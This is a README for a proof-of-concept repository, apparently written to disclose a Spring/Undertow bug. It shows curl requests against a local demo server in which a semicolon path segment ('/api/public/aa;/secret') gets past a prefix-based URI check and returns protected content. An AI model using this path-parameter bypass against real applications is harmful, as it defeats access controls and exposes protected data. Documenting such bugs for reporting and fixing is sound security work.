# spring & undertow Bug PoC

This server accept the request only if the path starts with `/api/public/`.

[DemoInterceptor](src/main/java/com/example/demo/DemoInterceptor.java) checks request URI.

```
$ curl "localhost:9000/secret" -i
HTTP/1.1 500 Internal Server Error
Connection: keep-alive
Content-Length: 0
Date: Thu, 29 Aug 2019 10:20:04 GMT
```

But the bug of undertow allows the user to access `/secret`.

```
$ curl "localhost:9000/api/public/aa;/secret" -i
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/plain;charset=UTF-8
Content-Length: 17
Date: Thu, 29 Aug 2019 10:19:00 GMT

this is secret!!!
```
